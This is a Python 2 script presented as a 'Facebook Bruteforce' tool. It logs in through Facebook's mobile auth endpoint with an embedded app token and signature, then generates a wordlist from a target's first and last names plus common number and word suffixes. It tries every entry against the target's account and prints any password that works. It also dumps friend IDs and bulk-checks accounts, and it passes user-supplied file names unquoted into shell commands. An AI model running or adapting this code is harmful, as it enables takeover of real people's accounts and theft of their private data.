import os
import sys
import time
import json
import urllib
import requests
import getpass
try:
    import requests
except ImportError:
    os.system('pip2 install requests')

def prints(dog):
    for id in dog + '\n':
        sys.stdout.write(id)
        sys.stdout.flush()
        time.sleep(10.0 / 2200)

w="\033[00m"
r="\033[31;1m"
g="\033[32;1m"
y="\033[33m"
d="\033[2;31m"
b="\033[34;1m"
p="\033[35;1m"
c="\033[36;1m"
W="\033[47m"
R="\033[41m"
B="\033[30m"
G="\033[90m"
BG="\033[100m"

def login():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print
        print g+' FACEBOOK BRUTEFORCE'+w+' - by @saydog.official'
        print w+'-------------------------------------------'
        print w+' You must Login using Facebook Account'
        print w+' because this methods using Facebook API.'
        print w+'-------------------------------------------'
        print w+' The author is not responsible if Account'
        print w+' has a checkpoint or is deactivated.'
        print w+'-------------------------------------------'
        print
        print w+'{'+p+'01'+w+'} Login using email & password'
        print w+'{'+p+'02'+w+'} Login using facebook token'
        print w+'{'+p+'00'+w+'} Back'
        print
        dog = raw_input(r+'saydog'+w+':'+p+'/facebook/'+w+'> ')
        if dog == '0' or dog == '00':
                sys.exit(1)
        elif dog == '1' or dog == '01':
                print
                username = raw_input(b+'[+]'+w+' username: ')
                password = getpass.getpass(b+'[+]'+w+' password: ')
                gettoken = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + username + '&locale=en_US&password=' + password + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                dog = gettoken.content
                jsl = json.loads(dog)
                if 'session_key' in dog:
                    open('login.txt', 'w').write(jsl['access_token'])
                    menu()
                elif 'www.facebook.com' in jsl['error_msg']:
                    print
                    prints(r+'[!SORRY]'+w+' Your account has been checkpoint')
                    os.system('rm -f login.txt')
                    print
                    sys.exit(1)
                else:
                    print
                    prints(r+'[!ERROR]'+w+' Login failed, please try again')
                    print
                    sys.exit(1)
        elif dog == '2' or dog == '02':
                print
                tokenfb = raw_input(b+'[+]'+w+' Input your token: '+y)
                os.system('touch login.txt;echo "'+tokenfb+'" > login.txt')
                print b+'[+]'+w+' Trying to login using token'
                try:
                        token = open('login.txt','r').read()
                        menu()
                except IOError:
                        login()
        else:
                sys.exit(1)
    except KeyboardInterrupt:
        sys.exit(1)
    else:
        menu()


def users():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print r+'[!ERROR]'+w+' Login failed, please try again!'
    else:
        dog = requests.get('https://graph.facebook.com/me?access_token=' + token)
        ID1 = json.loads(dog.text)
        nama = ID1['name']
        print
        print b+'[+]'+w+' Welcome to:-'+g+' Facebook Bruteforce'+w
        print b+'[+]'+w+' Login as:- '+g+nama+w
        print


def brute():
    global target
    try:
        token = open('login.txt', 'r').read()
    except:
        print
    else:
        try:
            email = target
            passw = open('../../../../result/wordlist.txt', 'r')
            gettoken = requests.get('https://graph.facebook.com/' + email + '?access_token=' + token)
            datget = json.loads(gettoken.text)
            nam = datget['name']
            for pas in passw:
                pas = pas.replace('\n', '')
                sys.stdout.write(b+'\r[+]'+w+' Trying password from wordlist: '+pas)
                sys.stdout.flush()
                loginfb = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pas + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                dog = json.loads(loginfb.text)
                if 'access_token' in dog:
                    print '\n'
                    print '\033[00m{\033[30m\033[47m Login Success \033[00m}'
                    print
                    print g+'[+]'+w+' Accounts : '+nam
                    print g+'[+]'+w+' Username : ' + email
                    print g+'[+]'+w+' Password : ' + pas
                    print
                    dog = raw_input('[ enter ]')
                    if dog == '':
                        sys.exit(1)
                    else:
                        sys.exit(1)
                elif 'www.facebook.com' in dog['error_msg']:
                    print '\n'
                    print '\033[00m{\033[30m\033[47m Login Success \033[00m}'
                    print
                    print g+'[+]'+w+' Accounts : '+nam
                    print g+'[+]'+w+' Username : ' + email
                    print g+'[+]'+w+' Password : ' + pas
                    print
                    print r+'[!]'+w+' Login successfully but account has been checkpoint'
                    print
                    dog = raw_input('[ enter ]')
                    if dog == '':
                        sys.exit(1)
                    else:
                        sys.exit(1)

        except KeyError:
            print
            print r+'[!ERROR]'+w+' Something wrong, please try again'

    print '\n'
    print r+'[!SORRY]'+w+' Password not found, please try again'
    print
    dog = raw_input('[ enter ]')
    if dog == ' ':
            sys.exit(1)
    else:
            sys.exit(1)


def target():
    global target
    print
    target = raw_input(b+'[+]'+w+' ID Target: ')
    print

def menu():
        try:
                token = open('login.txt','r')
        except IOError as KeyError:
                print r+'[!]'+w+' Something error, please try again later'
                os.system('rm -f login.txt')
        else:
                users()
                print w+'{'+p+'01'+w+'} Auto bruteforce target'
                print w+'{'+p+'02'+w+'} Multi bruteforce from file'
                print w+'{'+p+'03'+w+'} Bulk facebook checker'
                print w+'{'+p+'04'+w+'} Dump id from friend list'
                print w+'{'+p+'05'+w+'} Logout sessions'
                print w+'{'+p+'00'+w+'} Back'
                print
                dog = raw_input(r+'saydog'+w+':'+p+'/facebook/'+w+'> ')
                if dog == '1':
                        start1()
                elif dog == '2':
                        os.system('python2 multi-bruteforce.py')
                        print("")
                        menu()
                elif dog == '3':
                        global fbcheck
                        try:
                                print
                                fbcheck = raw_input(b+"[+]"+w+" Input file (fbchecker.txt): ")
                                if fbcheck == "" or fbcheck == " ":
                                        print
                                        print r+"[!ERROR]"+w+" file doesn't exist!"
                                        print
                                        sys.exit(1)
                                else:
                                        pass
                                print b+"[+]"+w+" Starting facebook checker"
                                print b+"[+]"+w+" This could take a while, please wait"
                                print b+"[+]"+w+" Press ctrl+c for stop the progress"
                                print
                                os.system("cat "+fbcheck+" > fbcheck.txt;php fbcheck.php fbcheck.txt")
                                print
                                dog = raw_input(w+"[ enter ]")
                                if dog == "":
                                        sys.exit(1)
                                else:
                                        sys.exit(1)
                        except KeyboardInterrupt:
                                sys.exit(1)
                elif dog == '4':
                        getid()
                elif dog == '5':
                        print
                        print r+'[!]'+w+' Removing access token from:- '+g+'socialmedia/bruteforce/login.txt'+w
                        time.sleep(3)
                        os.system('rm -rf login.txt')
                        print r+'[!]'+w+' Access token has been deleted'
                        time.sleep(2)
                        print r+'[!]'+w+' Logout'
                        print
                        time.sleep(2)
                        sys.exit(1)
                elif dog == '0' or dog == '00':
                        sys.exit(1)
                else:
                        sys.exit(1)

def start1():
    try:
        token = open('login.txt', 'r').read()
    except IOError as KeyError:
        print r+'[!ERROR]'+w+' Something wrong, please try again'
        os.system('rm -f login.txt')
    else:
        target()
        gettoken = requests.get('https://graph.facebook.com/' + target + '?access_token=' + token)
        js = json.loads(gettoken.text)
        prints(b+'[+]'+w+' Generating wordlist from target information')
        pas1 = js['first_name'] + '123'
        pas2 = js['first_name'] + '1234'
        pas3 = js['first_name'] + '12345'
        pas4 = js['first_name'] + '123456'
        pas5 = js['first_name'] + '1996'
        pas6 = js['first_name'] + '1997'
        pas7 = js['first_name'] + '1998'
        pas8 = js['first_name'] + '1999'
        pas9 = js['first_name'] + '2000'
        pas10 = js['first_name'] + '2001'
        pas11 = js['first_name'] + '2002'
        pas12 = js['first_name'] + '2003'
        pas13 = js['first_name'] + '2004'
        pas14 = js['first_name'] + '2005'
        pas15 = js['first_name'] + '01'
        pas16 = js['first_name'] + '02'
        pas17 = js['first_name'] + '03'
        pas18 = js['first_name'] + '04'
        pas19 = js['first_name'] + '05'
        pas39 = js['first_name'] + '06'
        pas40 = js['first_name'] + '07'
        pas41 = js['first_name'] + '08'
        pas42 = js['first_name'] + '09'
        pas43 = js['first_name'] + '10'
        pas44 = js['first_name'] + '11'
        pas45 = js['first_name'] + '12'
        pas46 = js['first_name'] + '13'
        pas47 = js['first_name'] + '14'
        pas48 = js['first_name'] + '15'
        pas49 = js['first_name'] + '16'
        pas50 = js['first_name'] + '17'
        pas51 = js['first_name'] + '18'
        pas52 = js['first_name'] + '19'
        pas53 = js['first_name'] + '20'
        pas54 = js['first_name'] + '21'
        pas55 = js['first_name'] + '22'
        pas56 = js['first_name'] + '23'
        pas57 = js['first_name'] + '24'
        pas58 = js['first_name'] + '25'
        pas59 = js['first_name'] + '26'
        pas60 = js['first_name'] + '27'
        pas61 = js['first_name'] + '28'
        pas62 = js['first_name'] + '29'
        pas63 = js['first_name'] + '30'
        pas64 = js['first_name'] + '0'
        pas65 = js['first_name'] + '00'
        pas66 = js['first_name'] + ''
        pas67 = js['first_name'] + '321'
        pas68 = js['first_name'] + '4321'
        pas69 = js['first_name'] + '54321'
        pas70 = js['first_name'] + '000'
        pas71 = js['first_name'] + '111'
        pas72 = js['first_name'] + '222'
        pas73 = js['first_name'] + '333'
        pas74 = js['first_name'] + '444'
        pas75 = js['first_name'] + '555'
        pas76 = js['first_name'] + '666'
        pas77 = js['first_name'] + '1'
        pas78 = js['first_name'] + '2'
        pas79 = js['first_name'] + '3'
        pas80 = js['first_name'] + '4'
        pas81 = js['first_name'] + '5'
        pas82 = js['first_name'] + '6'
        pas83 = js['first_name'] + '7'
        pas84 = js['first_name'] + '8'
        pas85 = js['first_name'] + '9'
        pas86 = js['first_name'] + js['last_name'] + '123'
        pas87 = js['first_name'] + js['last_name'] + '1234'
        pas88 = js['first_name'] + js['last_name'] + '12345'
        pas89 = js['first_name'] + js['last_name'] + '123456'
        pas90 = js['first_name'] + js['last_name'] + '1996'
        pas91 = js['first_name'] + js['last_name'] + '1997'
        pas92 = js['first_name'] + js['last_name'] + '1998'
        pas93 = js['first_name'] + js['last_name'] + '1999'
        pas94 = js['first_name'] + js['last_name'] + '2000'
        pas95 = js['first_name'] + js['last_name'] + '2001'
        pas96 = js['first_name'] + js['last_name'] + '2002'
        pas97 = js['first_name'] + js['last_name'] + '2003'
        pas98 = js['first_name'] + js['last_name'] + '2004'
        pas99 = js['first_name'] + js['last_name'] + '2005'
        pas100 = js['first_name'] + js['last_name'] + '01'
        pas101 = js['first_name'] + js['last_name'] + '02'
        pas102 = js['first_name'] + js['last_name'] + '03'
        pas103 = js['first_name'] + js['last_name'] + '04'
        pas104 = js['first_name'] + js['last_name'] + '05'
        pas105 = js['first_name'] + js['last_name'] + '06'
        pas106 = js['first_name'] + js['last_name'] + '07'
        pas107 = js['first_name'] + js['last_name'] + '08'
        pas108 = js['first_name'] + js['last_name'] + '09'
        pas109 = js['first_name'] + js['last_name'] + '10'
        pas110 = js['first_name'] + js['last_name'] + '11'
        pas111 = js['first_name'] + js['last_name'] + '12'
        pas112 = js['first_name'] + js['last_name'] + '13'
        pas113 = js['first_name'] + js['last_name'] + '14'
        pas114 = js['first_name'] + js['last_name'] + '15'
        pas115 = js['first_name'] + js['last_name'] + '16'
        pas116 = js['first_name'] + js['last_name'] + '17'
        pas117 = js['first_name'] + js['last_name'] + '18'
        pas118 = js['first_name'] + js['last_name'] + '19'
        pas119 = js['first_name'] + js['last_name'] + '20'
        pas120 = js['first_name'] + js['last_name'] + '21'
        pas121 = js['first_name'] + js['last_name'] + '22'
        pas122 = js['first_name'] + js['last_name'] + '23'
        pas123 = js['first_name'] + js['last_name'] + '24'
        pas124 = js['first_name'] + js['last_name'] + '25'
        pas125 = js['first_name'] + js['last_name'] + '26'
        pas126 = js['first_name'] + js['last_name'] + '27'
        pas127 = js['first_name'] + js['last_name'] + '28'
        pas128 = js['first_name'] + js['last_name'] + '29'
        pas129 = js['first_name'] + js['last_name'] + '30'
        pas130 = js['first_name'] + js['last_name'] + '0'
        pas131 = js['first_name'] + js['last_name'] + '00'
        pas132 = js['first_name'] + js['last_name'] + ''
        pas133 = js['first_name'] + js['last_name'] + '321'
        pas134 = js['first_name'] + js['last_name'] + '4321'
        pas135 = js['first_name'] + js['last_name'] + '54321'
        pas136 = js['first_name'] + js['last_name'] + '54321'
        pas137 = js['first_name'] + js['last_name'] + '000'
        pas138 = js['first_name'] + js['last_name'] + '111'
        pas139 = js['first_name'] + js['last_name'] + '222'
        pas140 = js['first_name'] + js['last_name'] + '333'
        pas141 = js['first_name'] + js['last_name'] + '444'
        pas142 = js['first_name'] + js['last_name'] + '555'
        pas143 = js['first_name'] + js['last_name'] + '666'
        pas144 = js['first_name'] + js['last_name'] + '1'
        pas145 = js['first_name'] + js['last_name'] + '2'
        pas146 = js['first_name'] + js['last_name'] + '3'
        pas147 = js['first_name'] + js['last_name'] + '4'
        pas148 = js['first_name'] + js['last_name'] + '5'
        pas149 = js['first_name'] + js['last_name'] + '6'
        pas150 = js['first_name'] + js['last_name'] + '7'
        pas151 = js['first_name'] + js['last_name'] + '8'
        pas152 = js['first_name'] + js['last_name'] + '9'
        pas153 = js['last_name'] + '123'
        pas154 = js['last_name'] + '1234'
        pas155 = js['last_name'] + '12345'
        pas156 = js['last_name'] + '123456'
        pas157 = js['last_name'] + '1996'
        pas158 = js['last_name'] + '1997'
        pas159 = js['last_name'] + '1998'
        pas160 = js['last_name'] + '1999'
        pas161 = js['last_name'] + '2000'
        pas162 = js['last_name'] + '2001'
        pas163 = js['last_name'] + '2002'
        pas164 = js['last_name'] + '2003'
        pas165 = js['last_name'] + '2004'
        pas166 = js['last_name'] + '2005'
        pas167 = js['last_name'] + '01'
        pas168 = js['last_name'] + '02'
        pas169 = js['last_name'] + '03'
        pas170 = js['last_name'] + '04'
        pas171 = js['last_name'] + '05'
        pas172 = js['last_name'] + '06'
        pas173 = js['last_name'] + '07'
        pas174 = js['last_name'] + '08'
        pas175 = js['last_name'] + '09'
        pas176 = js['last_name'] + '10'
        pas177 = js['last_name'] + '11'
        pas178 = js['last_name'] + '12'
        pas179 = js['last_name'] + '13'
        pas180 = js['last_name'] + '14'
        pas181 = js['last_name'] + '15'
        pas182 = js['last_name'] + '16'
        pas183 = js['last_name'] + '17'
        pas184 = js['last_name'] + '18'
        pas185 = js['last_name'] + '19'
        pas186 = js['last_name'] + '20'
        pas187 = js['last_name'] + '21'
        pas188 = js['last_name'] + '22'
        pas189 = js['last_name'] + '23'
        pas190 = js['last_name'] + '24'
        pas191 = js['last_name'] + '25'
        pas192 = js['last_name'] + '26'
        pas193 = js['last_name'] + '27'
        pas194 = js['last_name'] + '28'
        pas195 = js['last_name'] + '29'
        pas196 = js['last_name'] + '30'
        pas197 = js['last_name'] + '30'
        pas198 = js['last_name'] + '0'
        pas199 = js['last_name'] + '00'
        pas200 = js['last_name'] + ''
        pas201 = js['last_name'] + '321'
        pas202 = js['last_name'] + '4321'
        pas203 = js['last_name'] + '54321'
        pas204 = js['last_name'] + '000'
        pas205 = js['last_name'] + '111'
        pas206 = js['last_name'] + '222'
        pas207 = js['last_name'] + '333'
        pas208 = js['last_name'] + '444'
        pas209 = js['last_name'] + '555'
        pas210 = js['last_name'] + '666'
        pas211 = js['last_name'] + '1'
        pas212 = js['last_name'] + '2'
        pas213 = js['last_name'] + '3'
        pas214 = js['last_name'] + '4'
        pas215 = js['last_name'] + '5'
        pas216 = js['last_name'] + '6'
        pas217 = js['last_name'] + '7'
        pas218 = js['last_name'] + '8'
        pas219 = js['last_name'] + '9'
        pas220 = 'sayang'
        pas221 = 'sayang123'
        pas222 = 'sayang1234'
        pas223 = 'sayang12345'
        pas224 = 'qwerty'
        pas225 = 'qwerty123'
        pas226 = 'qwerty1234'
        pas227 = 'qwerty12345'
        pas228 = 'viking'
        pas229 = 'viking1933'
        pas230 = 'persib1933'
        pas231 = 'jakmania'
        pas232 = 'jakmania1997'
        pas233 = 'aremania'
        pas234 = 'aremania1987'
        pas235 = 'bonekmania'
        pas236 = 'bonekmania1927'
        pas237 = 'slankers'
        pas238 = 'slankers123'
        pas239 = 'slankers1234'
        pas240 = 'slankers12345'
        pas241 = 'falsmania123'
        pas242 = 'falsmania1234'
        pas243 = 'falsmania12345'
        pas244 = 'indonesia'
        pas245 = 'indonesia123'
        pas246 = 'indonesia1234'
        pas247 = 'indonesia12345'
        pas248 = 'indonesiaraya'
        pas249 = 'indonesiaraya123'
        pas250 = 'indonesiaraya1234'
        pas251 = 'indonesiaraya12345'
        N = '\n'
        file = open('../../../../result/wordlist.txt', 'w')
        file.write(pas1 + N)
        file.write(pas2 + N)
        file.write(pas3 + N)
        file.write(pas4 + N)
        file.write(pas5 + N)
        file.write(pas6 + N)
        file.write(pas7 + N)
        file.write(pas8 + N)
        file.write(pas9 + N)
        file.write(pas10 + N)
        file.write(pas11 + N)
        file.write(pas12 + N)
        file.write(pas13 + N)
        file.write(pas14 + N)
        file.write(pas15 + N)
        file.write(pas16 + N)
        file.write(pas17 + N)
        file.write(pas18 + N)
        file.write(pas19 + N)
        file.write(pas39 + N)
        file.write(pas40 + N)
        file.write(pas41 + N)
        file.write(pas42 + N)
        file.write(pas43 + N)
        file.write(pas44 + N)
        file.write(pas45 + N)
        file.write(pas46 + N)
        file.write(pas47 + N)
        file.write(pas48 + N)
        file.write(pas49 + N)
        file.write(pas50 + N)
        file.write(pas51 + N)
        file.write(pas52 + N)
        file.write(pas53 + N)
        file.write(pas54 + N)
        file.write(pas55 + N)
        file.write(pas56 + N)
        file.write(pas57 + N)
        file.write(pas58 + N)
        file.write(pas59 + N)
        file.write(pas60 + N)
        file.write(pas61 + N)
        file.write(pas62 + N)
        file.write(pas63 + N)
        file.write(pas64 + N)
        file.write(pas65 + N)
        file.write(pas66 + N)
        file.write(pas67 + N)
        file.write(pas68 + N)
        file.write(pas69 + N)
        file.write(pas70 + N)
        file.write(pas71 + N)
        file.write(pas72 + N)
        file.write(pas73 + N)
        file.write(pas74 + N)
        file.write(pas75 + N)
        file.write(pas76 + N)
        file.write(pas77 + N)
        file.write(pas78 + N)
        file.write(pas79 + N)
        file.write(pas80 + N)
        file.write(pas81 + N)
        file.write(pas82 + N)
        file.write(pas83 + N)
        file.write(pas84 + N)
        file.write(pas85 + N)
        file.write(pas86 + N)
        file.write(pas87 + N)
        file.write(pas88 + N)
        file.write(pas89 + N)
        file.write(pas90 + N)
        file.write(pas91 + N)
        file.write(pas92 + N)
        file.write(pas93 + N)
        file.write(pas94 + N)
        file.write(pas95 + N)
        file.write(pas96 + N)
        file.write(pas97 + N)
        file.write(pas98 + N)
        file.write(pas99 + N)
        file.write(pas100 + N)
        file.write(pas101 + N)
        file.write(pas102 + N)
        file.write(pas103 + N)
        file.write(pas104 + N)
        file.write(pas105 + N)
        file.write(pas106 + N)
        file.write(pas107 + N)
        file.write(pas108 + N)
        file.write(pas109 + N)
        file.write(pas110 + N)
        file.write(pas111 + N)
        file.write(pas112 + N)
        file.write(pas113 + N)
        file.write(pas114 + N)
        file.write(pas115 + N)
        file.write(pas116 + N)
        file.write(pas117 + N)
        file.write(pas118 + N)
        file.write(pas119 + N)
        file.write(pas120 + N)
        file.write(pas121 + N)
        file.write(pas122 + N)
        file.write(pas123 + N)
        file.write(pas124 + N)
        file.write(pas125 + N)
        file.write(pas126 + N)
        file.write(pas127 + N)
        file.write(pas128 + N)
        file.write(pas129 + N)
        file.write(pas130 + N)
        file.write(pas131 + N)
        file.write(pas132 + N)
        file.write(pas133 + N)
        file.write(pas134 + N)
        file.write(pas135 + N)
        file.write(pas136 + N)
        file.write(pas137 + N)
        file.write(pas138 + N)
        file.write(pas139 + N)
        file.write(pas140 + N)
        file.write(pas141 + N)
        file.write(pas142 + N)
        file.write(pas143 + N)
        file.write(pas144 + N)
        file.write(pas145 + N)
        file.write(pas146 + N)
        file.write(pas147 + N)
        file.write(pas148 + N)
        file.write(pas149 + N)
        file.write(pas150 + N)
        file.write(pas151 + N)
        file.write(pas152 + N)
        file.write(pas153 + N)
        file.write(pas154 + N)
        file.write(pas155 + N)
        file.write(pas156 + N)
        file.write(pas157 + N)
        file.write(pas158 + N)
        file.write(pas159 + N)
        file.write(pas160 + N)
        file.write(pas161 + N)
        file.write(pas162 + N)
        file.write(pas163 + N)
        file.write(pas164 + N)
        file.write(pas165 + N)
        file.write(pas166 + N)
        file.write(pas167 + N)
        file.write(pas168 + N)
        file.write(pas169 + N)
        file.write(pas170 + N)
        file.write(pas171 + N)
        file.write(pas172 + N)
        file.write(pas173 + N)
        file.write(pas174 + N)
        file.write(pas175 + N)
        file.write(pas176 + N)
        file.write(pas177 + N)
        file.write(pas178 + N)
        file.write(pas179 + N)
        file.write(pas180 + N)
        file.write(pas181 + N)
        file.write(pas182 + N)
        file.write(pas183 + N)
        file.write(pas184 + N)
        file.write(pas185 + N)
        file.write(pas186 + N)
        file.write(pas187 + N)
        file.write(pas188 + N)
        file.write(pas189 + N)
        file.write(pas190 + N)
        file.write(pas191 + N)
        file.write(pas192 + N)
        file.write(pas193 + N)
        file.write(pas194 + N)
        file.write(pas195 + N)
        file.write(pas196 + N)
        file.write(pas197 + N)
        file.write(pas198 + N)
        file.write(pas199 + N)
        file.write(pas200 + N)
        file.write(pas201 + N)
        file.write(pas202 + N)
        file.write(pas203 + N)
        file.write(pas204 + N)
        file.write(pas205 + N)
        file.write(pas206 + N)
        file.write(pas207 + N)
        file.write(pas208 + N)
        file.write(pas209 + N)
        file.write(pas210 + N)
        file.write(pas211 + N)
        file.write(pas212 + N)
        file.write(pas213 + N)
        file.write(pas214 + N)
        file.write(pas215 + N)
        file.write(pas216 + N)
        file.write(pas217 + N)
        file.write(pas218 + N)
        file.write(pas219 + N)
        file.write(pas220 + N)
        file.write(pas221 + N)
        file.write(pas222 + N)
        file.write(pas223 + N)
        file.write(pas224 + N)
        file.write(pas225 + N)
        file.write(pas226 + N)
        file.write(pas227 + N)
        file.write(pas228 + N)
        file.write(pas229 + N)
        file.write(pas230 + N)
        file.write(pas231 + N)
        file.write(pas232 + N)
        file.write(pas233 + N)
        file.write(pas234 + N)
        file.write(pas236 + N)
        file.write(pas237 + N)
        file.write(pas238 + N)
        file.write(pas239 + N)
        file.write(pas240 + N)
        file.write(pas241 + N)
        file.write(pas242 + N)
        file.write(pas243 + N)
        file.write(pas244 + N)
        file.write(pas245 + N)
        file.write(pas246 + N)
        file.write(pas247 + N)
        file.write(pas248 + N)
        file.write(pas249 + N)
        file.write(pas250 + N)
        file.write(pas251 + N)
        file.close()
        prints(b+'[+]'+w+' Wordlist has been generated')
        prints(b+'[+]'+w+' Using default wordlist:- '+g+'result/wordlist.txt'+w)
        print
        extra = raw_input('Do you want to add extra wordlist from file? (y/n) ')
        if extra == 'y' or extra == 'Y':
                print
                extra = raw_input(b+'[+]'+w+' input file: ')
                file = extra
                os.system('cat '+file+' >> wordlist.txt')
                print b+'[+]'+w+' Bruteforce is running'
                pass
        else:
                pass
        print
        brute()

def getid():
        idt = []
        try:
                toket=open('login.txt','r').read()
        except IOError:
                os.system('rm -rf login.txt')
                time.sleep(1)
                login()
        try:
                r=requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
                z=json.loads(r.text)
                print
                print b+'[+]'+w+' Trying to get ID Friends'
                time.sleep(3)
                sv = open('../../../../result/id_friends.txt','w')
                for a in z['data']:
                        idt.append(a['id'])
                        sv.write(a['id'] + '\n')
                sv.close()
                os.system("sed '1d' ../../../../result/id_friends.txt > out.txt;sed '1d' out.txt > outs.txt;cat outs.txt > ../../../../result/id_friends.txt;rm -rf out.txt outs.txt")
                print b+"[+]"+w+" Total ID:-"+g+" %s" %(len(idt))
                print g+"[+]"+w+" File saved as:- "+g+"result/id_friends.txt"+w
                print
                dog = raw_input('[ enter ]')
                menu()
        except IOError:
                print r+"[!ERROR]"+w+" No such file or directory"
                menu()
        except (KeyboardInterrupt,EOFError):
                sys.exit(1)
        except KeyError:
                print
                print r+'[!ERROR]'+w+' Something wrong, please try again'
                print r+'[!ERROR]'+w+' Removing access token'
                os.system('rm -rf login.txt')
                print
                dog = raw_input('[ enter ]')
                if dog == '':
                        sys.exit(1)
                else:
                        sys.exit(1)
        except requests.exceptions.ConnectionError:
                print r+'[!ERROR]'+w+' Connection error, please try again'
                print
                dog = raw_input('[ enter ]')
                if dog == '':
                        sys.exit(1)
                else:
                        sys.exit(1)


def main():
        try:
                login()
        except KeyError:
                print
                print r+'[!ERROR]'+w+' Something wrong, please try again'
                print r+'[!ERROR]'+w+' Removing access token'
                os.system('rm -rf login.txt')
                print
                dog = raw_input('[ enter ]')
                if dog == '':
                        sys.exit(1)
                else:
                        sys.exit(1)
        except requests.exceptions.ConnectionError:
                print r+'[!ERROR]'+w+' Connection error, please try again'
                print
                dog = raw_input('[ enter ]')
                if dog == '':
                        sys.exit(1)
                else:
                        sys.exit(1)
        except KeyboardInterrupt:
                sys.exit(0)

if __name__ == '__main__':
        try:
                if '--facebook-run' in sys.argv:
                        main()
                else:
                        os.system('saydog')
        except IOError:
                os.system('pip2 install requests &> /dev//null')
